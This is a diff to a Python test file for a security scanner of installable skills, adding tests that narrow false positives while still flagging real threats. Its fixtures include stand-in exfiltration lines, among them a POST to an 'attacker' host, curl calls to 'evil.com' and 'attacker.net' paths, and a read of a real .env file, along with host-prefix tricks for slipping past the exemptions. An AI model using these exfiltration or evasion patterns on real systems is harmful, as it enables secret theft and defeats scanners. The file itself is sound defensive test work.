@@ -30,6 +30,7 @@ from tools.skills_guard import (
     _determine_verdict,
     _resolve_trust_level,
     _check_structure,
+    _COMPILED_THREAT_PATTERNS,
     _unicode_char_name,
     _load_skill_ignore,
     MAX_FILE_COUNT,
@@ -561,6 +562,112 @@ class TestFalsePositiveReductions:
         assert any(
             fi.pattern_id == "read_secrets_file" for fi in scan_file(bad, "bad.sh")
         )
+
+    def test_instructional_prose_not_flagged_as_exfil_or_supply_chain(self, tmp_path):
+        # #37036: the install-pipeline scanner flagged an entire legitimate community
+        # skill (mksglu/context-mode, 16k stars, public) as DANGEROUS because:
+        #   * `cat .env.example` matched the ``read_secrets_file`` pattern (no real secrets,
+        #     it's a template file),
+        #   * `fetch('http://localhost:3000/...')` matched ``remote_fetch`` (RFC 5735 loopback,
+        #     by definition non-routable),
+        #   * `fetch('https://api.example.com/...')` matched ``remote_fetch`` (RFC 2606 reserved
+        #     domain),
+        #   * a markdown table row ``npm install / build | 120000`` matched
+        #     ``unpinned_npm_install`` (not a command being executed).
+        # The defensive lookaheads added to the three patterns above should silence these
+        # without weakening the actual catch.
+        md = tmp_path / "SKILL.md"
+        md.write_text(
+            # cat .env.example in prose (template file, no real secrets)
+            "## Anti-patterns\n\n- `cat .env.example` — small config file\n"
+            # fetch with localhost (loopback)
+            "```js\nconst resp = await fetch('http://localhost:3000/api/orders');\n```\n"
+            # fetch with RFC 2606 example domain
+            "```js\nconst resp = await fetch('https://api.example.com/health');\n```\n"
+            # fetch with .test TLD (RFC 6761 reserved)
+            "```js\nconst resp = await fetch('https://api.svc.test/health');\n```\n"
+            # npm install inside a markdown table row (timeout preset, not a command)
+            "| npm install / build | 120000 |\n",
+            encoding="utf-8",
+        )
+        findings = scan_file(md, "SKILL.md")
+        # All four must be silent:
+        assert not any(f.pattern_id == "read_secrets_file" for f in findings), \
+            "cat .env.example must not be read_secrets_file"
+        assert not any(f.pattern_id == "remote_fetch" for f in findings), \
+            "fetch(localhost/example.com/test) must not be remote_fetch"
+        assert not any(f.pattern_id == "unpinned_npm_install" for f in findings), \
+            "npm install in a markdown table row must not be unpinned_npm_install"
+
+        # Counter-tests: the patterns must STILL catch the dangerous shapes.
+        real_env = tmp_path / "bad.sh"
+        real_env.write_text("cat ~/.config/myapp/.env | tee /tmp/x\n", encoding="utf-8")
+        assert any(
+            f.pattern_id == "read_secrets_file" for f in scan_file(real_env, "bad.sh")
+        ), "real .env reads must still be flagged"
+
+        real_fetch = tmp_path / "real_fetch.js"
+        real_fetch.write_text(
+            "fetch('https://api.attacker.example.invalid/exfil', {method:'POST'})\n",
+            encoding="utf-8",
+        )
+        # ``attacker.example.invalid`` is not in the RFC 2606 reserved list and the TLD
+        # .invalid is also reserved -- remote_fetch should still match because the
+        # negative lookahead only exempts the example.com/.org/.net/example subdomains
+        # and .test, not arbitrary strings containing 'example'.
+        assert any(
+            f.pattern_id == "remote_fetch" for f in scan_file(real_fetch, "real_fetch.js")
+        ), "real remote fetches must still be flagged"
+
+    def test_37036_exemptions_end_at_the_sample_they_were_written_for(self, tmp_path):
+        # Review follow-up on the #37036 carve-outs: an exemption has to stop exactly where the
+        # sample it was written for stops, or it swallows ordinary inputs nobody intended to exempt.
+        #   * `remote_fetch`'s lookahead sits right after `https://` with no host terminator, so any
+        #     host merely *beginning* with an exempt label (`example.com.attacker.net`) was exempted.
+        #   * `\s+` in `npm\s+install\s+` matches the newline, so the lookaheads ran against the
+        #     *next* line: an unpinned `npm install` followed by a table row was read as one.
+        #   * `\b` holds at the `.` before `old`, so `\b`-terminated templates exempted `.env.dist.old`
+        #     -- a copy of a real env file someone edited.
+        bypass = tmp_path / "bypass.md"
+        bypass.write_text(
+            "cat .env.dist.old\n"
+            "curl 'https://example.com.attacker.net/steal'\n"
+            "curl 'https://localhost.attacker.net/steal'\n"
+            "curl 'https://127.0.0.11.evil.com/x'\n"
+            "curl 'https://test.evil.io/x'\n",
+            encoding="utf-8",
+        )
+        ids = {f.pattern_id for f in scan_file(bypass, "bypass.md")}
+        for pid in ("read_secrets_file", "remote_fetch"):
+            assert pid in ids, f"{pid} must still fire when the exemption is only a prefix"
+        assert "unpinned_npm_install" not in ids, "a bare `npm install` line is not a pinned install"
+
+        # `scan_file` matches line by line, so the `npm install` lookaheads can never see more than
+        # the rest of their own line -- assert the same property on the pattern itself, where the
+        # `\s+` used to swallow the newline and hand the exemption to whatever came next.
+        npm = {pid: rx for rx, pid, *_ in _COMPILED_THREAT_PATTERNS}["unpinned_npm_install"]
+        assert not npm.search("| npm install / build | 120000 |"), "table row stays exempt"
+        assert not npm.search("npm install some-pkg@1.2.3"), "a pinned install stays exempt"
+        assert npm.search("npm install some-pkg"), "a real unpinned install still fires"
+        assert npm.search("npm install\nnpm run build | 5"), "next line must not exempt"
+        assert npm.search("npm install some-pkg\n\n| tool | 3 |"), "next line must not exempt"
+
+        # The intended exemptions must stay silent -- including the host-terminator shapes: `/`
+        # (path), `:` (port), end-of-line, and the same-line markdown table row.
+        exempt = tmp_path / "exempt.md"
+        exempt.write_text(
+            "cat .env.example\n"
+            "curl https://api.example.com/health\n"
+            "curl http://localhost:3000/x\n"
+            "curl https://api.svc.test/health\n"
+            "curl https://example.com\n"
+            "| npm install / build | 120000 |\n",
+            encoding="utf-8",
+        )
+        assert not any(
+            f.pattern_id in {"read_secrets_file", "remote_fetch", "unpinned_npm_install"}
+            for f in scan_file(exempt, "exempt.md")
+        ), "the #37036 exemptions must stay silent on the samples they were written for"
 
     def test_python_credential_file_read_is_critical_and_plugin_admission_is_dangerous(self, tmp_path):
         # #116950: `open()`/`Path(...).read_*()` on a known credential file was only caught by the
